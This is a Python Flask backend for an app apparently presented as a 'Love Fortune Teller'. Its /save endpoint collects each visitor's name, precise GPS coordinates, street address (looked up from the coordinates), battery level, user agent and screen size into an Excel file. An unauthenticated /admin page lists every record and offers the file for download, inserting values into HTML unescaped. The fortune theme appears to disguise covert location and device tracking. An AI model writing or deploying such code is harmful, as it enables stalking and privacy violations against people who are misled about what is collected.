from flask import Flask, request, jsonify
from flask_cors import CORS
import pandas as pd
import requests
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

EXCEL_FILE = 'fortunes_data.xlsx'

def init_excel():
    if not os.path.exists(EXCEL_FILE):
        df = pd.DataFrame(columns=['timestamp', 'name', 'latitude', 'longitude', 'accuracy', 'address', 'battery', 'userAgent', 'screen'])
        df.to_excel(EXCEL_FILE, index=False)

def geocode_reverse(lat, lon):
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
        resp = requests.get(url, headers={'User-Agent': 'LoveFortuneTeller/1.0'})
        data = resp.json()
        return data.get('display_name', 'Unknown')
    except:
        return 'Address unavailable'

@app.route('/')
def home():
    return "Love Fortune Teller Backend 💕"

@app.route('/save', methods=['POST'])
def save_data():
    init_excel()
    data = request.json
    
    address = geocode_reverse(data['latitude'], data['longitude'])
    
    new_row = {
        'timestamp': datetime.now().isoformat(),
        'name': data['name'],
        'latitude': data['latitude'],
        'longitude': data['longitude'],
        'accuracy': data['accuracy'],
        'address': address,
        'battery': data['battery'],
        'userAgent': data['userAgent'],
        'screen': data['screen']
    }
    
    df = pd.read_excel(EXCEL_FILE)
    df = pd.concat([df, pd.DataFrame([new_row])], ignore_index=True)
    df.to_excel(EXCEL_FILE, index=False)
    
    return jsonify({'status': 'saved', 'love': 'captured 💖'})

@app.route('/admin')
def admin():
    if not os.path.exists(EXCEL_FILE):
        return "No data yet 💕"
    
    df = pd.read_excel(EXCEL_FILE)
    html = "<h1>Love Data Admin 💋</h1><table border='1'>"
    for col in df.columns:
        html += f"<th>{col}</th>"
    for _, row in df.iterrows():
        html += "<tr>"
        for val in row:
            html += f"<td>{val}</td>"
        html += "</tr>"
    html += "</table><br><a href='/fortunes_data.xlsx'>Download Excel</a>"
    return html

if __name__ == '__main__':
    init_excel()
    app.run(host='0.0.0.0', port=5000)
